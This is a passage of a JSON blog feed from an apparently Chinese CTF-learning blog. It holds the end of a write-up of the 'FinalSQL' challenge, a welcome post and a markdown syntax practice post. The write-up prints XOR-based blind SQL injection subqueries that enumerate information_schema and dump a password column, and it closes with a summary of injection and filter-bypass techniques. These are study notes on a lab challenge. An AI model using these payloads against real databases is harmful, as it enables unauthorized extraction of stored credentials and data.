data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaVRmY3g4cHdReW1KRUxNLnBuZw==\">https://i.loli.net/2021/06/21/iTfcx8pwQymJELM.png</span>&quot; alt=&quot;hard6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p 7725665e-c9b1-4558-b610-12bcccca00ce>flag</p>\n<h1 id=\"no5-finalsql\"><a class=\"anchor\" href=\"#no5-finalsql\">#</a> NO.5 FinalSQL</h1>\n<p>根据界面提示 本题可能为 sql 盲注</p>\n<p>所以先做 FUZZ 测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNFpBTllPcWp1M3MyUTVELnBuZw==\">https://i.loli.net/2021/06/21/4ZANYOqju3s2Q5D.png</span>&quot; alt=&quot;fin1&quot; style=&quot;zoom:33%;&quot; /&gt;</p>\n<p>可以发现，大部分语句被屏蔽，选择盲注。而点击 1 时，发现</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUGpIblNvUnlHSXpmdWw4LnBuZw==\">https://i.loli.net/2021/06/21/PjHnSoRyGIzful8.png</span>&quot; alt=&quot;fin2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>而输入 7 时</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNm1yemhuRXBTYWxna2NqLnBuZw==\">https://i.loli.net/2021/06/21/6mrzhnEpSalgkcj.png</span>&quot; alt=&quot;fin3&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>输入更大的超范围数同理，发现注入点</p>\n<p>用 FUZZ 测试，个别未被屏蔽，但报错信息被屏蔽</p>\n<p>最后我选择用异或 ^ 注入进行盲注：</p>\n<p>1^(sql 注入判断语句)</p>\n<p>如果显示（NO！），说明 id=1，进一步说明 sql 判断语句为 假</p>\n<p>如果显示（ERROR!!!），说明 id=0，进一步说明 sql 判断语句为 真</p>\n<p>写一个 py 跑</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvOGVRYVQ3ZnFNbmtYb0h3LnBuZw==\">https://i.loli.net/2021/06/21/8eQaT7fqMnkXoHw.png</span>&quot; alt=&quot;fin4&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<p>同理将 datebase () 替换为</p>\n<pre><code>(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek'))\n</code></pre>\n<p>再跑 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0FlQjQ5YUNrZEY2bzVTLnBuZw==\">https://i.loli.net/2021/06/21/sAeB49aCkdF6o5S.png</span>&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>再换为</p>\n<pre><code>(select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y')\n</code></pre>\n<p>再跑 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZEVYSTZPR29hSlBDckhCLnBuZw==\">https://i.loli.net/2021/06/21/dEXI6OGoaJPCrHB.png</span>&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<p>再换</p>\n<pre><code>(select(group_concat(passVord))from(F1naI1y))\n</code></pre>\n<p>再跑</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0dYdFNsUlY3UE11YUs1LnBuZw==\">https://i.loli.net/2021/06/21/sGXtSlRV7PMuaK5.png</span>&quot; alt=&quot;fin8&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>得出 flag</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>写了一下午，当然，总结出一些 sql 相关的东西</p>\n<p>1. 页面上有显示位时，用联合注入 union；页面上没有显示位，但是有 SQL 语句执行错误信息输出时用报错注入</p>\n<p>2. 联合查询 先判断整型还是字符型，order by 查列数，获取库名，获取表名，获取字段名，获取数据</p>\n<p>3. 报错注入不用查列数，直接通过 extractvalue 函数报错查信息</p>\n<p>4. 当有绕过时，进行模糊测试，考虑是否为 双写绕过或空格绕过</p>\n<p>5. 若都不是，找可注入点进行盲注，一般这种题都会有可注入点让我们下手。盲注写 py 暴力破解即可。</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/06/16/running%20till%20the%20sun%20goes%20down/",
            "url": "http://example.com/2021/06/16/running%20till%20the%20sun%20goes%20down/",
            "title": "running till the sun goes down",
            "date_published": "2021-06-16T08:45:29.595Z",
            "content_html": "<p>welcome to my blog！</p>\n<p>blog 里记录了我 (菜鸡) 在学习 ctf 中第一次遇到的 or 实在不会的题</p>\n<p>查文章请看目录或搜索 tag</p>\n<p>请点击   -&gt; 展开全文   阅读</p>\n<hr>\n<p><span id=\"more\"></span></p>\n<hr>\n<p>诚不欺你，好看吧！奥特曼就交给你自己复原了哈～</p>\n<p><img data-src=\"https://i.loli.net/2021/10/08/DdAt72zuc4x56FK.jpg\" alt=\"ASOUL原图.jpg\"></p>\n",
            "tags": [
                "yeah"
            ]
        },
        {
            "id": "http://example.com/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/",
            "url": "http://example.com/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/",
            "title": "（Test）markdown语法复习",
            "date_published": "2021-06-16T08:24:31.783Z",
            "content_html": "<p>测试一下 blog，顺便复习一下 md 语法。</p>\n<p>测试软件为 Typora</p>\n<p><span id=\"more\"></span></p>\n<h2 id=\"一-标题\"><a class=\"anchor\" href=\"#一-标题\">#</a> 一、标题</h2>\n<p>、#  这是一级标题</p>\n<p>、## 这是二级标题</p>\n<p>、### 这是三级标题</p>\n<p>、#### 这是四级标题</p>\n<p>、##### 这是五级标题</p>\n<p>、###### 这是六级标题</p>\n<h2 id=\"二-字体\"><a class=\"anchor\" href=\"#二-字体\">#</a> 二、字体</h2>\n<p>加粗   <strong>这是加粗文字</strong></p>\n<p><strong><em>要加粗的文字左右分别用两个</em>号包起来</strong></p>\n<p>倾斜   <em>这是倾斜文字</em></p>\n<p><strong><em>要倾斜的文字左右分别用一个</em>号包起来</strong></p>\n<p>斜体加粗  <em><strong>这是斜体加粗文字</strong></em></p>\n<p><strong><em>要倾斜和加粗的文字左右分别用三个</em>号包起来</strong></p>\n<p>删除线   <s>这是加线文字</s></p>\n<p><em><strong>要加删除线的文字左右分别用两个～～号包起来</strong></em></p>\n<h2 id=\"三-引用\"><a class=\"anchor\" href=\"#三-引用\">#</a> 三、引用</h2>\n<p><em><strong>在引用的文字前加 &gt; 即可。引用也可以嵌套，如加两个 &gt;&gt; 三个 &gt;&gt;&gt;</strong></em></p>\n<blockquote>\n<p>&lt;u&gt; 这是引用的内容 &lt;/u&gt;</p>\n<blockquote>\n<p>&lt;u&gt; 这是引用的内容 &lt;/u&gt;</p>\n<blockquote>\n<p>&lt;u&gt; 这是引用过的内容 &lt;/u&gt;</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>这是引用的内容。。</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"四-分割线\"><a class=\"anchor\" href=\"#四-分割线\">#</a> 四、分割线</h2>\n<p><strong>三个或者三个以上的 - 或者 * 都可以。</strong></p>\n<hr>\n<hr>\n<h2 id=\"五-图片\"><a class=\"anchor\" href=\"#五-图片\">#</a> 五、图片</h2>\n<p><em><strong>格式：![图片 alt](图片地址 '' 图片 title'')</strong></em></p>\n<p><em><strong>图片 alt 就是显示在图片下面的文字，相当于对图片内容的解释。</strong></em></p>\n<p><em><strong>图片 title 是图片的标题，当鼠标移到图片上时显示的内容。title 可加可不加。</strong></em></p>\n<p>示例</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cDovL2ltZzEubHVrb3UuY29tL3N0YXRpYy9wL2Jsb2cvbWVkaXVtLzAwMjgvODAvNjYvNjMvMjg4MDY2NjMuanBn\">http://img1.lukou.com/static/p/blog/medium/0028/80/66/63/28806663.jpg</span>&quot;alt=&quot; 夜晚背景图 &quot;title=&quot; 夜空 &quot;style=&quot;zoom: 67%;&quot; /&gt;</p>\n<h2 id=\"六-超链接\"><a class=\"anchor\" href=\"#六-超链接\">#</a> 六、超链接</h2>\n<p><em><strong>[超链接名] (超链接地址 &quot;超链接 title&quot;)</strong></em></p>\n<p><em><strong>去掉 ] 后的空格，title 可加可不加！</strong></em></p>\n<p>示例：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pbw==\">高萌的博客</span></p>\n<h2 id=\"七-列表\"><a class=\"anchor\" href=\"#七-列表\">#</a> 七、列表</h2>\n<p><strong>语法： 无序列表用 - + * 任何一种都可以</strong></p>\n<ul>\n<li>\n<p>列表内容 （-）</p>\n<ul>\n<li>\n<p>列表内容 （+）</p>\n<ul>\n<li>列表内容 （*）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>（三种列表）</p>\n<p><em><strong>列表嵌套</strong></em></p>\n<p><em><strong>上一级和下一级之间敲三个空格即可</strong></em></p>\n<h2 id=\"八-表格\"><a class=\"anchor\" href=\"#八-表格\">#</a> 八、 表格</h2>\n<table>\n<thead>\n<tr>\n<th>表头</th>\n<th style=\"text-align:center\">表头</th>\n<th style=\"text-align:right\">表头</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n</tbody>\n</table>\n<p><em><strong>直接从段落插入 更快一些。</strong></em></p>\n<h2 id=\"九-代码\"><a class=\"anchor\" href=\"#九-代码\">#</a> 九、代码</h2>\n<p><em><strong>单行代码：代码之间分别用一个反引号包起来</strong></em></p>\n<p>(`) 不用加括号</p>\n<p><code> printf(&quot;hello world\\n&quot;);</code></p>\n<p><em><strong>代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行</strong></em></p>\n<p>(```)，结尾同理，不用加括号</p>\n<hr>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tE N D</p>\n",
            "tags": [
                "随笔"
            ]
        }
    ]
}